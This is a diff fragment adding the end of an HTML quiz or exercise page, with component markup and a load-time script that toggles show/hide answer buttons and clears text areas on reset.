+                        <!--?lit$278323178$-->                    
+                      </div>
+                      <!--?lit$278323178$--><!--?-->  
+                  </div>
+              </div>
+            </div>
+          </div>
+        
+      </opentextbox-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!---->
+                            </div>
+                        </div>
+                        <!--?lit$278323178$-->
+                    </div>
+                </div>
+            </div>
+        <sgpluse-opentextboxcontroller-view modelid="645bd9bce870d8103c0b383e" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"></sgpluse-opentextboxcontroller-view><script></script></body>
+<script>
+    window.addEventListener("load", function () {
+      console.log("loaded");
+      document.querySelectorAll(".answergray").forEach(function (ele) {
+        ele.classList.add("u-display-none");
+      });
+      document.querySelectorAll(".hide-answer").forEach(function (ele) {
+        ele.classList.add("u-display-none");
+      });
+      document.querySelectorAll(".show-answer").forEach(function (ele) {
+        ele.addEventListener("click", function (e) {
+          e.currentTarget.nextElementSibling.classList.remove("u-display-none");
+          e.currentTarget
+            .closest(".question-container")
+            .querySelectorAll(".answergray")
+            .forEach(function (ele) {
+              ele.classList.remove("u-display-none");
+            });
+          ele.classList.add("u-display-none");
+        });
+      });
+      document.querySelectorAll(".hide-answer").forEach(function (ele) {
+        ele.addEventListener("click", function (e) {
+          e.currentTarget.previousElementSibling.classList.remove("u-display-none");
+          e.currentTarget
+            .closest(".question-container")
+            .querySelectorAll(".answergray")
+            .forEach(function (ele) {
+              ele.classList.add("u-display-none");
+            });
+          ele.classList.add("u-display-none");
+        });
+      });
+      var event = new Event("click", {
+        bubbles: true,
+        cancelable: true,
+      });
+      document
+        .querySelectorAll(".openTextBoxController__showButton")
+        .forEach(function (ele) {
+          ele.addEventListener("click", function (e) {
+            e.currentTarget.nextElementSibling.classList.remove("u-display-none");
+            ele.classList.add("u-display-none");
+            document.querySelectorAll(".show-answer").forEach(function (ele) {
+              ele.dispatchEvent(event);
+            });
+          });
+        });
+
+      document
+        .querySelectorAll(".openTextBoxController__hideButton")
+        .forEach(function (ele) {
+          ele.addEventListener("click", function (e) {
+            e.currentTarget.previousElementSibling.classList.remove("u-display-none");
+            ele.classList.add("u-display-none");
+            document.querySelectorAll(".hide-answer").forEach(function (ele) {
+              ele.dispatchEvent(event);
+            });
+          });
+        });
+
+      document
+        .querySelectorAll(".openTextBoxController__resetButton")
+        .forEach(function (ele) {
+          ele.addEventListener("click", function (e) {
+            document.querySelectorAll("textArea").forEach(function (ele) {
+              ele.value = "";
+            });
+          });
+        });
+    });
+  </script>
+  </html>
